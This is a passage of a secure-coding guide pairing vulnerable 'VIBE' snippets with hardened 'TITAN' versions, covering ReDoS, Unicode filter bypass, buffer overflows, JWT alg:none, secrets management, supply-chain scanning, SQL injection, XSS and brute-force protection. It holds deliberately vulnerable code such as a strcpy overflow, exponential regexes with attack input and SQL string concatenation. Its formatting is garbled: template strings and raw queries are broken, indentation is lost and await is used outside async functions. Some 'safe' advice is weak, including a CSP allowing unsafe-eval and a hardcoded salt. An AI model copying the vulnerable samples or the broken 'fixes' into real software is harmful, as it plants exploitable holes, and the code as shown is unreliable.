def verify_password(provided: str, hashed: str) -> bool:

## argon2.verify is constant-time internally
return argon2.verify(provided, hashed)

## TITAN: Node.js constant-time comparison

## const crypto = require('crypto');

#

## function verifyApiKey(provided, stored) {

## // crypto.timingSafeEqual is constant-time

## const a = Buffer.from(provided);

## const b = Buffer.from(stored);

#

## if (a.length !== b.length) {

## // Still compare to prevent length oracle

## return crypto.timingSafeEqual(a, a) && false;

## }

#

## return crypto.timingSafeEqual(a, b);

## }

```text

## REDOS - REGEX DENIAL OF SERVICE

## The Scar

> "Email validation regex: ^([a-zA-Z0-9]+)+@example.com$
> Attacker input: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
> Regex engine backtracks 2^28 times. Server hangs.
> CPU 100% for minutes on single request."

```python

## VIBE: Catastrophic backtracking patterns

import re

## These regexes have exponential backtracking

BAD_EMAIL = r'^([a-zA-Z0-9]+)+@'  # Nested quantifiers
BAD_URL = r'^(https?://)?(\w+\.)+\w+$'  # Nested quantifiers
BAD_HTML = r'<.*>.*</.*>'  # Greedy with overlap

def validate_email(email):

## With input: 'a' * 30 + '!'

## Takes MINUTES to return False
return re.match(BAD_EMAIL + r'example\.com$', email)

```python

## TITAN: Safe regex patterns

import re

## Use possessive quantifiers or atomic groups (not in Python re)

## Or rewrite to avoid nested quantifiers

## Safe email validation (no nested quantifiers)

SAFE_EMAIL = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

## TITAN: Use regex with timeouts

import signal

class TimeoutError(Exception):
    pass

def timeout_handler(signum, frame):
raise TimeoutError("Regex timeout")

def safe_regex_match(pattern, string, timeout=1):
signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    try:
return re.match(pattern, string)
except TimeoutError:
return None
    finally:
        signal.alarm(0)

## TITAN: Use linear-time regex engine

import google_re2 as re2  # Google RE2 guarantees linear time

def validate_input(pattern, text):

## RE2 uses finite automata, no backtracking

## Guaranteed O(n) time complexity
return re2.match(pattern, text)

## TITAN: Pre-validate input length

MAX_INPUT_LENGTH = 1000

def validate_with_guard(pattern, text):
if len(text) > MAX_INPUT_LENGTH:
raise ValueError("Input too long")
return re.match(pattern, text)

```text

## UNICODE NORMALIZATION ATTACKS

## The Scar

> "Username filter blocks 'admin'. Attacker registers (script
> After Unicode normalization, displays as 'admin'.
> Or: File path with %c0%ae%c0%ae becomes '..' after normalization.
> Directory traversal bypasses security filter."

```python

## VIBE: Filter before normalization

def check_username(username):
if username.lower() == 'admin':
raise ValueError("Reserved username")

## Save to database (which normalizes Unicode)
return username

## Attacker passes: (circled letters)

## Filter passes. Database normalizes to 'admin'

```python

## TITAN: Normalize BEFORE checking

import unicodedata

def sanitize_username(username: str) -> str:

## Normalize to NFKC (compatibility composition)

## Converts l, a, III, etc.
normalized = unicodedata.normalize('NFKC', username)

## Remove zero-width characters (invisible)

## U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM)
invisible_chars = ['\u200b', '\u200c', '\u200d', '\ufeff', '\u00ad']
for char in invisible_chars:
normalized = normalized.replace(char, '')

## Now check against reserved names
if normalized.lower() in ['admin', 'root', 'system']:
raise ValueError("Reserved username")

return normalized

## TITAN: Confusable character detection

from confusables import is_confusable, normalize

def check_homograph(input_str, protected_str):

## Detect visually similar characters

## (Cyrillic vs 'paypal.com' (Latin 'a')
return is_confusable(input_str, protected_str)

## TITAN: Locale-aware case conversion (Turkish problem)

def safe_lowercase(text: str, locale: str = 'en') -> str:

## Turkish: 'I'.lower() should be (dotless i), not 'i'

## Don't use .lower() for security comparisons!
import icu  # PyICU
return icu.UnicodeString(text).toLower(icu.Locale(locale))

```text

## BUFFER OVERFLOW PREVENTION PATTERNS

## The Scar

> "C function uses strcpy() without bounds checking.
> Attacker input overwrites return address.
> Arbitrary code execution. Full system compromise."

```c
// VIBE: Unbounded copy
void vulnerable(char *input) {
char buffer[64];
strcpy(buffer, input);  // No bounds checking!
}

// VIBE: Off-by-one in loop
void off_by_one(char *input) {
char buffer[64];
for (int i = 0; i <= 64; i++) {  // Should be < 64
buffer[i] = input[i];
    }
}

```c
// TITAN: Bounded string operations

## include <string.h>

void safe_copy(char *input) {
char buffer[64];

// strncpy with explicit size
strncpy(buffer, input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';  // Ensure null termination

// Or use strlcpy (BSD) / strcpy_s (Windows)
// strlcpy(buffer, input, sizeof(buffer));
}

// TITAN: Use stack canaries and ASLR
// Compile with:
// gcc -fstack-protector-all -pie -fPIE -D_FORTIFY_SOURCE=2 program.c

// TITAN: In Rust, memory safety by default
// fn safe_buffer(input: &str) -> String {
// let mut buffer = String::with_capacity(64);
// buffer.push_str(&input[..input.len().min(64)]);
// buffer
// }

```text

## END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS

---

## VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION

## JWT SECURITY PITFALLS

### The Scar

> "JWT token validated signature. Accepted `alg: none`.
> Attacker removes signature, sets alg to 'none'.
> Token accepted. Admin access granted.
> Library had algorithm confusion vulnerability."

```typescript
// VIBE: Accept any algorithm
import jwt from 'jsonwebtoken';

function verifyToken(token: string) {
return jwt.verify(token, SECRET_KEY);  // Accepts ANY algorithm!
}
// Attacker sets header: {"alg": "none"}, removes signature = valid token

```typescript
// TITAN: Strict JWT verification
import jwt, { JwtPayload, Algorithm } from 'jsonwebtoken';

interface TokenPayload extends JwtPayload {
sub: string;
role: string;
permissions: string[];
}

class JWTService {
private readonly secretKey: string;
private readonly allowedAlgorithms: Algorithm[] = ['HS256', 'HS384', 'HS512'];
private readonly issuer: string;
private readonly audience: string;

constructor(config: {
secretKey: string;
issuer: string;
audience: string;
}) {
this.secretKey = config.secretKey;
this.issuer = config.issuer;
this.audience = config.audience;
    }

| sign(payload: Omit<TokenPayload, 'iat' | 'exp' | 'iss' | 'aud'>): string { |
return jwt.sign(
        {
        ...payload,
iss: this.issuer,
aud: this.audience,
        },
        this.secretKey,
        {
algorithm: 'HS256',  // Explicit algorithm
expiresIn: '15m',    // Short-lived access tokens
notBefore: 0,  // Valid immediately
        }
        );
    }

verify(token: string): TokenPayload {
try {
const decoded = jwt.verify(token, this.secretKey, {
algorithms: this.allowedAlgorithms,  // CRITICAL: Whitelist algorithms
issuer: this.issuer,  // Verify issuer
audience: this.audience,  // Verify audience
clockTolerance: 30,  // 30 second tolerance
}) as TokenPayload;

// Additional checks
| if (!decoded.sub |  | typeof decoded.sub !== 'string') { |
throw new Error('Invalid subject claim');
        }

return decoded;

} catch (error) {
if (error instanceof jwt.TokenExpiredError) {
throw new AuthError('Token expired', 'TOKEN_EXPIRED');
        }
if (error instanceof jwt.JsonWebTokenError) {
throw new AuthError('Invalid token', 'INVALID_TOKEN');
        }
throw error;
        }
    }

// Refresh token with rotation
createRefreshToken(userId: string): string {
const tokenId = crypto.randomUUID();

// Store in database for revocation
await this.tokenStore.save({
id: tokenId,
        userId,
createdAt: new Date(),
expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),  // 7 days
        });

return jwt.sign(
{ sub: userId, jti: tokenId },
        this.secretKey,
{ algorithm: 'HS256', expiresIn: '7d' }
        );
    }

async rotateRefreshToken(oldToken: string): Promise<{ accessToken: string; refreshToken: string }> {
const decoded = this.verify(oldToken);

// Revoke old token
await this.tokenStore.revoke(decoded.jti);

// Check if already revoked (token reuse attack)
const stored = await this.tokenStore.get(decoded.jti);
| if (!stored |  | stored.revokedAt) { |
// Potential attack - revoke ALL user tokens
await this.tokenStore.revokeAllForUser(decoded.sub);
throw new AuthError('Token reuse detected', 'TOKEN_REUSE');
        }

// Issue new tokens
return {
accessToken: this.sign({ sub: decoded.sub, role: decoded.role, permissions: decoded.permissions }),
refreshToken: this.createRefreshToken(decoded.sub),
        };
    }
}

```text

## SECRETS MANAGEMENT WITH VAULT

### The Scar

> "API keys in .env file. Committed to GitHub.
> Private repo. Then made public for portfolio.
> AWS keys exposed. $50k bill overnight.
> Crypto miners spun up hundreds of instances."

```python

## VIBE: Hardcoded secrets

import os

AWS_KEY = "AKIAIOSFODNN7EXAMPLE"  # Hardcoded!
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # Hardcoded!

## Or slightly better but still dangerous

AWS_KEY = os.getenv("AWS_KEY")  # In .env, might get committed

```python

## TITAN: HashiCorp Vault integration

import hvac
from functools import lru_cache
from datetime import datetime, timedelta
import logging

class VaultSecretManager:
"""Production secrets management with HashiCorp Vault."""

def __init__(self, vault_addr: str, auth_method: str = 'kubernetes'):
self.client = hvac.Client(url=vault_addr)
self.auth_method = auth_method
self.lease_cache: dict[str, tuple[dict, datetime]] = {}

## Authenticate based on environment
        self._authenticate()

def _authenticate(self):
"""Authenticate to Vault using appropriate method."""

if self.auth_method == 'kubernetes':

## Read service account token
with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
jwt = f.read()

        self.client.auth.kubernetes.login(
        role='myapp',
        jwt=jwt
        )

elif self.auth_method == 'aws':

## IAM authentication
        self.client.auth.aws.iam_login(
        role='myapp',
        mount_point='aws'
        )

elif self.auth_method == 'approle':

## For CI/CD
import os
        self.client.auth.approle.login(
        role_id=os.environ['VAULT_ROLE_ID'],
        secret_id=os.environ['VAULT_SECRET_ID']
        )

def get_secret(self, path: str, key: str) -> str:
"""Get a secret value with caching and lease management."""

## Check cache
cache_key = f"{path}:{key}"
if cache_key in self.lease_cache:
secret, expires_at = self.lease_cache[cache_key]
if datetime.now() < expires_at:
return secret[key]

## Fetch from Vault
response = self.client.secrets.kv.v2.read_secret_version(
        path=path,
        mount_point='secret'
        )

secret = response['data']['data']

## Cache with lease
lease_duration = response.get('lease_duration', 3600)
expires_at = datetime.now() + timedelta(seconds=lease_duration - 60)  # 60s buffer
self.lease_cache[cache_key] = (secret, expires_at)

return secret[key]

def get_dynamic_database_credentials(self, role: str) -> tuple[str, str]:
"""Get dynamic database credentials (auto-rotating)."""

response = self.client.secrets.database.generate_credentials(
        name=role,
        mount_point='database'
        )

username = response['data']['username']
password = response['data']['password']

## Log for audit
logging.info(f"Generated dynamic DB creds for role {role}, lease_id: {response['lease_id']}")

return username, password

def rotate_api_key(self, key_name: str) -> str:
"""Rotate an API key with zero downtime."""

## 1. Generate new key
new_key = secrets.token_urlsafe(32)

## 2. Read current key
current = self.get_secret(f'api-keys/{key_name}', 'current')

## 3. Update Vault with both keys active
        self.client.secrets.kv.v2.create_or_update_secret(
        path=f'api-keys/{key_name}',
        secret={
'current': new_key,
'previous': current,  # Keep old key valid temporarily
'rotated_at': datetime.now().isoformat()
        },
        mount_point='secret'
        )

return new_key

## Usage

vault = VaultSecretManager(
    vault_addr='https://vault.company.com',
    auth_method='kubernetes'
)

## Get static secret

api_key = vault.get_secret('myapp/config', 'stripe_api_key')

## Get dynamic database credentials

db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')

```text

## API KEY ROTATION

## The Scar

> "Same API key for 3 years. Never rotated.
> Employee left, still had the key.
> Used it from competitor company.
> No audit trail. Couldn't prove breach source."

```python

## VIBE: Static API keys

API_KEY = "static_key_never_changes_123"

@app.get("/api/data")
def get_data(api_key: str = Header()):
if api_key != API_KEY:
raise HTTPException(401)
return {"data": "secret"}

```python

## TITAN: Rotating API keys with audit trail

from datetime import datetime, timedelta
from typing import Optional
import hashlib
import secrets

class APIKeyManager:
"""Production API key management with rotation and audit."""

def __init__(self, db, redis):
self.db = db
self.redis = redis

async def create_api_key(
        self,
user_id: str,
name: str,
permissions: list[str],
expires_in_days: int = 365
) -> tuple[str, str]:
"""Create new API key. Returns (key_id, secret) - secret shown only once!"""

## Generate key components
key_id = f"sk_{secrets.token_urlsafe(8)}"
key_secret = secrets.token_urlsafe(32)
key_hash = self._hash_key(key_secret)

## Store in database (NEVER store the secret!)
await self.db.api_keys.create(
        data={
'id': key_id,
'user_id': user_id,
'name': name,
'key_hash': key_hash,
'permissions': permissions,
'created_at': datetime.utcnow(),
'expires_at': datetime.utcnow() + timedelta(days=expires_in_days),
'last_used_at': None,
'rotation_reminder_sent': False
        }
        )

## Audit log
await self._audit_log(user_id, 'API_KEY_CREATED', {'key_id': key_id, 'name': name})

## Return full key (only time it's visible)
full_key = f"{key_id}.{key_secret}"
return key_id, full_key

async def validate_key(self, full_key: str) -> Optional[dict]:
"""Validate API key and return permissions."""

        try:
key_id, key_secret = full_key.split('.', 1)
except ValueError:
return None

## Check cache first
cache_key = f"apikey:{key_id}"
cached = await self.redis.get(cache_key)

if cached:
key_data = json.loads(cached)
        else:

## Fetch from database
key_data = await self.db.api_keys.find_unique(
where={'id': key_id}
        )

if not key_data:
return None

## Cache for 5 minutes
await self.redis.setex(cache_key, 300, json.dumps(key_data))

## Verify hash
if not self._verify_key(key_secret, key_data['key_hash']):
await self._audit_log(None, 'API_KEY_INVALID_SECRET', {'key_id': key_id})
return None

## Check expiration
if datetime.fromisoformat(key_data['expires_at']) < datetime.utcnow():
await self._audit_log(key_data['user_id'], 'API_KEY_EXPIRED', {'key_id': key_id})
return None

## Check if revoked
if key_data.get('revoked_at'):
return None

## Update last used (async, don't block request)
        asyncio.create_task(self._update_last_used(key_id))

return {
'user_id': key_data['user_id'],
'permissions': key_data['permissions'],
'key_id': key_id
        }

async def rotate_key(self, key_id: str) -> tuple[str, str]:
"""Rotate API key with grace period for old key."""

old_key = await self.db.api_keys.find_unique(where={'id': key_id})

if not old_key:
raise ValueError("Key not found")

## Create new key
new_key_id, new_full_key = await self.create_api_key(
        user_id=old_key['user_id'],
name=f"{old_key['name']} (rotated)",
        permissions=old_key['permissions']
        )

## Mark old key for deprecation (still valid for 24 hours)
await self.db.api_keys.update(
where={'id': key_id},
        data={
'deprecated_at': datetime.utcnow(),
'expires_at': datetime.utcnow() + timedelta(hours=24)
        }
        )

## Invalidate cache
await self.redis.delete(f"apikey:{key_id}")

await self._audit_log(
        old_key['user_id'],
        'API_KEY_ROTATED',
{'old_key_id': key_id, 'new_key_id': new_key_id}
        )

return new_key_id, new_full_key

def _hash_key(self, secret: str) -> str:
"""Hash API key secret for storage."""
return hashlib.pbkdf2_hmac(
        'sha256',
        secret.encode(),
b'api_key_salt_xyz', # Use proper salt from config
        100000
        ).hex()

def _verify_key(self, secret: str, stored_hash: str) -> bool:
"""Verify key secret against stored hash."""
return secrets.compare_digest(
        self._hash_key(secret),
        stored_hash
        )

```text

## END OF VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION

---

## VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY

## DEPENDENCY VULNERABILITY DISASTERS

### The Scar

> "Log4Shell announced. Checked: we use log4j.
> Where? 47 different services. Transitive dependency.
> No SBOM. No dependency graph. Manual audit.
> Took 2 weeks to find and patch everywhere."

```yaml

## VIBE: No dependency scanning

## Just run npm install and hope nothing bad happens

```yaml

## TITAN: GitHub Actions with dependency scanning and SBOM

name: Security Pipeline

on:
  push:
branches: [main]
  pull_request:
  schedule:
- cron: '0 6 * * *'  # Daily vulnerability check

jobs:
  dependency-scan:
runs-on: ubuntu-latest
    steps:
- uses: actions/checkout@v4

## Generate SBOM (Software Bill of Materials)
- name: Generate SBOM
uses: anchore/sbom-action@v0
        with:
path: .
format: spdx-json
output-file: sbom.spdx.json

## Scan for vulnerabilities
- name: Vulnerability Scan
uses: anchore/scan-action@v3
        with:
sbom: sbom.spdx.json
fail-build: true
severity-cutoff: high

## Check for known malicious packages
- name: Malware Scan
| run: |
npx lockfile-lint --path package-lock.json \
--validate-https \
--validate-package-names \
        --validate-checksum

## Upload SBOM as artifact
- uses: actions/upload-artifact@v3
        with:
name: sbom
path: sbom.spdx.json

## Attest SBOM for provenance
- uses: actions/attest-sbom@v1
        with:
subject-path: sbom.spdx.json
sbom-path: sbom.spdx.json

  container-security:
runs-on: ubuntu-latest
    steps:
- uses: actions/checkout@v4

- name: Build image
run: docker build -t myapp:${{ github.sha }} .

## Scan container image
- name: Trivy container scan
uses: aquasecurity/trivy-action@master
        with:
image-ref: myapp:${{ github.sha }}
format: sarif
output: trivy-results.sarif
severity: 'CRITICAL,HIGH'
exit-code: 1

## Upload scan results
- uses: github/codeql-action/upload-sarif@v2
        with:
sarif_file: trivy-results.sarif

```python

## TITAN: Continuous dependency monitoring

from dataclasses import dataclass
from datetime import datetime
import subprocess
import json

@dataclass
class VulnerabilityAlert:
package: str
version: str
severity: str
cve_id: str
| fixed_version: str | None |
affected_services: list[str]

class DependencyMonitor:
def __init__(self, github_token: str, slack_webhook: str):
self.github = github_token
self.slack = slack_webhook
self.known_vulns: set[str] = set()

async def scan_monorepo(self, repo_path: str) -> list[VulnerabilityAlert]:
"""Scan all services in monorepo for vulnerabilities."""
alerts = []

## Find all package.json files
result = subprocess.run(
['find', repo_path, '-name', 'package.json', '-not', '-path', '*/node_modules/*'],
capture_output=True, text=True
        )

package_files = result.stdout.strip().split('\n')

for pkg_file in package_files:
service_name = pkg_file.split('/')[-2]

## Run npm audit
audit_result = subprocess.run(
['npm', 'audit', '--json'],
cwd=pkg_file.rsplit('/', 1)[0],
capture_output=True, text=True
        )

        try:
audit_data = json.loads(audit_result.stdout)

for vuln_id, vuln_info in audit_data.get('vulnerabilities', {}).items():
if vuln_info['severity'] in ['high', 'critical']:
alert = VulnerabilityAlert(
        package=vuln_id,
version=vuln_info.get('range', 'unknown'),
        severity=vuln_info['severity'],
cve_id=vuln_info.get('via', [{}])[0].get('cve', 'N/A'),
fixed_version=vuln_info.get('fixAvailable', {}).get('version'),
        affected_services=[service_name]
        )

## Deduplicate
alert_key = f"{alert.package}:{alert.cve_id}"
if alert_key not in self.known_vulns:
        alerts.append(alert)
        self.known_vulns.add(alert_key)
except json.JSONDecodeError:
        continue

return alerts

async def notify_security_team(self, alerts: list[VulnerabilityAlert]):
"""Send Slack notification for new vulnerabilities."""
if not alerts:
        return

critical = [a for a in alerts if a.severity == 'critical']
high = [a for a in alerts if a.severity == 'high']

message = {
"blocks": [
        {
"type": "header",
"text": {
"type": "plain_text",
"text": {len(alerts)} New Vulnerabilities Detected"
        }
        },
        {
"type": "section",
"text": {
"type": "mrkdwn",
| "text": f"*Critical:* {len(critical)} | *High:* {len(high)}" |
        }
        }
        ]
        }

for alert in critical[:5]:  # Top 5 critical
        message["blocks"].append({
"type": "section",
"text": {
"type": "mrkdwn",
"text": f"*{alert.package}* ({alert.cve_id})\n"
f"Services: {', '.join(alert.affected_services)}\n"
f"Fix: Upgrade to `{alert.fixed_version}`"
        }
        })

await self._send_slack(message)

```text

## CONTAINER IMAGE SIGNING

## The Scar

> "Deployed to production. Image pulled from registry.
> Someone had pushed a backdoored image with same tag.
> No signature verification. Running attacker's code.
> Detected 3 weeks later during security audit."

```yaml

## VIBE: Pull any image, trust registry

spec:
  containers:
- image: registry.io/app:latest  # Anyone could have pushed this

```yaml

## TITAN: Cosign image signing and verification

name: Sign and Verify Images

jobs:
  build-sign-push:
runs-on: ubuntu-latest
    permissions:
id-token: write  # For keyless signing
packages: write

    steps:
- uses: actions/checkout@v4

- name: Install Cosign
uses: sigstore/cosign-installer@v3

- name: Login to Registry
uses: docker/login-action@v3
        with:
registry: ghcr.io
username: ${{ github.actor }}
password: ${{ secrets.GITHUB_TOKEN }}

- name: Build and Push
id: build
uses: docker/build-push-action@v5
        with:
push: true
tags: ghcr.io/${{ github.repository }}:${{ github.sha }}

## Sign with keyless signing (Sigstore)
- name: Sign Image
        env:
COSIGN_EXPERIMENTAL: 1
| run: |
cosign sign --yes \
ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}

## Attest SBOM
- name: Attest SBOM
| run: |
cosign attest --yes \
--predicate sbom.spdx.json \
--type spdxjson \
ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}

```yaml

## TITAN: Kubernetes admission controller for signature verification

## Kyverno policy

apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
name: verify-image-signature
spec:
validationFailureAction: Enforce
background: false
  rules:
- name: verify-cosign-signature
      match:
        any:
- resources:
        kinds:
- Pod
      verifyImages:
- imageReferences:
- "ghcr.io/company/*"
        attestors:
- entries:
- keyless:
issuer: "https://token.actions.githubusercontent.com"
subject: "https://github.com/company/*/.github/workflows/*"
        rekor:
url: https://rekor.sigstore.dev
        attestations:
- predicateType: https://spdx.dev/Document
        conditions:
- all:
- key: "{{ creationInfo.created }}"
operator: GreaterThan
value: "2024-01-01T00:00:00Z"

```text

## END OF VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY

---

## VOLUME 5: ADVANCED SECURITY PATTERNS

## OWASP TOP 10 PROTECTION

### SQL Injection Prevention

```typescript
// ? TITAN: Production SQL injection prevention
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

class SecureQueryBuilder {
// ? VULNERABLE: String concatenation
static async unsafeSearch(userInput: string) {
// NEVER DO THIS
return prisma.\(\SELECT * FROM products WHERE name LIKE '%\%'\);
  }

// ? SAFE: Parameterized queries
static async safeSearch(userInput: string) {
// Prisma automatically parameterizes
return prisma.product.findMany({
where: {
name: {
contains: userInput,
mode: 'insensitive'
        }
      }
    });
  }

// ? SAFE: Raw query with parameters
static async safeRawSearch(userInput: string) {
return prisma.\\
SELECT * FROM products
WHERE name ILIKE \
    \;
  }

// Input validation layer
static validateAndSanitize(input: string): string {
// Remove dangerous characters
const sanitized = input
.replace(/[<>'";]/g, '')  // Remove SQL special chars
      .trim()
.slice(0, 100);  // Limit length

// Validate format
if (!/^[a-zA-Z0-9\s-]+\$/.test(sanitized)) {
throw new ValidationError('Invalid search input');
    }

return sanitized;
  }
}

```text

---

### XSS Prevention

```typescript
// ? TITAN: Production XSS prevention
import DOMPurify from 'isomorphic-dompurify';
import { escape } from 'lodash';

class XSSPrevention {
// Sanitize HTML content (for rich text)
static sanitizeHTML(dirty: string): string {
return DOMPurify.sanitize(dirty, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
ALLOWED_ATTR: ['href', 'target', 'rel'],
ALLOW_DATA_ATTR: false,
// Force links to open in new tab safely
ADD_ATTR: ['target', 'rel'],
FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
FORBID_ATTR: ['onclick', 'onerror', 'onload', 'style']
    });
  }

// Escape for text content
static escapeText(text: string): string {
return escape(text);
  }

// Validate URL to prevent javascript: protocol
static sanitizeURL(url: string): string {
try {
const parsed = new URL(url);
if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
return '#';  // Block dangerous protocols
      }
return url;
} catch {
return '#';
    }
  }

// Content Security Policy header
static getCSPHeader(): string {
return [
"default-src 'self'",
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com",
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
"img-src 'self' data: https: blob:",
"font-src 'self' https://fonts.gstatic.com",
"connect-src 'self' https://api.example.com wss://socket.example.com",
"frame-ancestors 'none'",
"base-uri 'self'",
"form-action 'self'"
].join('; ');
  }
}

// React component with XSS protection
function SafeUserContent({ content }: { content: string }) {
const sanitized = XSSPrevention.sanitizeHTML(content);

return (
    <div
dangerouslySetInnerHTML={{ __html: sanitized }}
// Additional protection with CSP meta tag
    />
  );
}

```text

---

## AUTHENTICATION HARDENING

### Secure Password Handling

```typescript
// ? TITAN: Production password security
import argon2 from 'argon2';
import crypto from 'crypto';

class PasswordService {
// Argon2id is the recommended algorithm (winner of PHC)
private static readonly ARGON2_OPTIONS = {
type: argon2.argon2id,
memoryCost: 65536,  // 64MB
timeCost: 3,  // 3 iterations
parallelism: 4,  // 4 threads
hashLength: 32
  };

static async hash(password: string): Promise<string> {
// Add server-side pepper for defense in depth
const peppered = this.addPepper(password);
return argon2.hash(peppered, this.ARGON2_OPTIONS);
  }

static async verify(password: string, hash: string): Promise<boolean> {
const peppered = this.addPepper(password);

try {
return await argon2.verify(hash, peppered);
} catch {
return false;
    }
  }

private static addPepper(password: string): string {
const pepper = process.env.PASSWORD_PEPPER!;
return crypto
.createHmac('sha256', pepper)
      .update(password)
      .digest('hex');
  }

// Check password against breach databases
static async checkBreached(password: string): Promise<boolean> {
const hash = crypto.createHash('sha1').update(password).digest('hex').toUpperCase();
const prefix = hash.slice(0, 5);
const suffix = hash.slice(5);

const response = await fetch(\https://api.pwnedpasswords.com/range/\\);
const text = await response.text();

return text.includes(suffix);
  }

// Password strength validation
static validateStrength(password: string): { valid: boolean; errors: string[] } {
const errors: string[] = [];

if (password.length < 12) {
errors.push('Password must be at least 12 characters');
    }
if (!/[A-Z]/.test(password)) {
errors.push('Password must contain uppercase letter');
    }
if (!/[a-z]/.test(password)) {
errors.push('Password must contain lowercase letter');
    }
if (!/[0-9]/.test(password)) {
errors.push('Password must contain number');
    }
if (!/[^A-Za-z0-9]/.test(password)) {
errors.push('Password must contain special character');
    }

// Check for common patterns
const commonPatterns = [
      /^123456/,
      /password/i,
      /qwerty/i,
/(.)\1{3,}/ // Repeated characters
    ];

if (commonPatterns.some(p => p.test(password))) {
errors.push('Password contains common pattern');
    }

return { valid: errors.length === 0, errors };
  }
}

```text

---

## RATE LIMITING & BRUTE FORCE PROTECTION

### Account Lockout Pattern

```typescript
// ? TITAN: Production brute force protection
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

interface LockoutConfig {
maxAttempts: number;
lockoutDuration: number;  // seconds
attemptWindow: number;    // seconds
}

class BruteForceProtection {
private config: LockoutConfig = {
maxAttempts: 5,
lockoutDuration: 900,   // 15 minutes
attemptWindow: 300  // 5 minutes
  };

async recordAttempt(identifier: string, success: boolean): Promise<void> {
const key = \login:attempts:\\;

if (success) {
// Clear attempts on successful login
await redis.del(key);
await redis.del(\login:lockout:\\);
} else {
// Increment failed attempts
const attempts = await redis.incr(key);

if (attempts === 1) {
// Set expiry on first attempt
await redis.expire(key, this.config.attemptWindow);
      }

if (attempts >= this.config.maxAttempts) {
// Lock the account
await redis.setex(
        \login:lockout:\\,
        this.config.lockoutDuration,
        'locked'
        );

// Log security event
await this.logSecurityEvent(identifier, 'ACCOUNT_LOCKED');

// Alert on repeated lockouts
const lockoutCount = await redis.incr(\login:lockout:count:\\);
if (lockoutCount >= 3) {
await this.alertSecurityTeam(identifier);
        }
      }
    }
  }

async isLocked(identifier: string): Promise<{ locked: boolean; ttl: number }> {
const ttl = await redis.ttl(\login:lockout:\\);
return { locked: ttl > 0, ttl: Math.max(0, ttl) };
  }

async getRemainingAttempts(identifier: string): Promise<number> {
const attempts = await redis.get(\login:attempts:\\);
| return Math.max(0, this.config.maxAttempts - (parseInt(attempts |  | '0', 10))); |
  }

private async logSecurityEvent(identifier: string, event: string): Promise<void> {
await prisma.securityLog.create({
data: {
        identifier,
        event,
timestamp: new Date(),
metadata: {}
      }
    });
  }

private async alertSecurityTeam(identifier: string): Promise<void> {
// Send alert via PagerDuty/Slack
console.error(\SECURITY ALERT: Multiple lockouts for \\);
  }
}

// Express middleware
async function bruteForceMiddleware(req: Request, res: Response, next: NextFunction) {
const protection = new BruteForceProtection();
| const identifier = req.ip |  | req.body.email; |

const { locked, ttl } = await protection.isLocked(identifier);

if (locked) {
return res.status(429).json({
error: 'Account temporarily locked',
retryAfter: ttl,
message: \Too many failed attempts. Try again in \ minutes.\
    });
  }

// Add remaining attempts to response headers
const remaining = await protection.getRemainingAttempts(identifier);
res.set('X-RateLimit-Remaining', String(remaining));

  next();
}

```text

---

## SECRET MANAGEMENT

### HashiCorp Vault Integration

```typescript
// ? TITAN: Production secrets management
import Vault from 'node-vault';

class SecretsManager {
private vault;
private secretCache: Map<string, { value: string; expires: number }> = new Map();
private cacheLifetime = 300000; // 5 minutes

constructor() {
this.vault = Vault({
endpoint: process.env.VAULT_ADDR,
token: process.env.VAULT_TOKEN
    });
  }

async getSecret(path: string): Promise<string> {
// Check cache first
const cached = this.secretCache.get(path);
if (cached && cached.expires > Date.now()) {
return cached.value;
    }

// Fetch from Vault
const result = await this.vault.read(\secret/data/\\);
const value = result.data.data.value;

// Cache the secret
this.secretCache.set(path, {
      value,
expires: Date.now() + this.cacheLifetime
    });

return value;
  }

async getDatabaseCredentials(): Promise<{ username: string; password: string }> {
const dbPath = 'database/creds/my-role';
const result = await this.vault.read(dbPath);

return {
username: result.data.username,
password: result.data.password
    };
  }

// Rotate secrets periodically
async rotateSecret(path: string, newValue: string): Promise<void> {
await this.vault.write(\secret/data/\\, {
data: { value: newValue }
    });

// Invalidate cache
    this.secretCache.delete(path);
  }
}

// Dynamic database credentials
async function createDBConnection() {
const secrets = new SecretsManager();
const creds = await secrets.getDatabaseCredentials();

return new Pool({
host: process.env.DB_HOST,
database: process.env.DB_NAME,
user: creds.username,  // Dynamic credentials
password: creds.password, // Auto-rotated by Vault
max: 20
  });
}

```text

---

### END OF SECURITY VOLUME 5

### Lines: ~400+ added

---

## VOLUME 6: REAL 2024 NEXTAUTH.JS PRODUCTION ISSUES

## Source: Stack Overflow, GitHub Issues, Developer Reports

> ?? **This is REAL authentication debugging knowledge from production apps.**

---

## SESSION NOT PERSISTING

### The Error

```text
User logs in successfully but:

- Redirects to home page as unauthenticated

- useSession() returns null

- Protected routes are inaccessible

```text

### Real Causes and Fixes

### Cause 1: Missing NEXTAUTH_SECRET in Production

```typescript
// ? VIBE: Works locally, breaks in production
// .env.local has NEXTAUTH_SECRET, but .env.production doesn't

// ? TITAN: Set in production environment
// Vercel Dashboard ? Settings ? Environment Variables
// NEXTAUTH_SECRET = <long-random-string>

// Generate a secure secret:
// npx auth secret
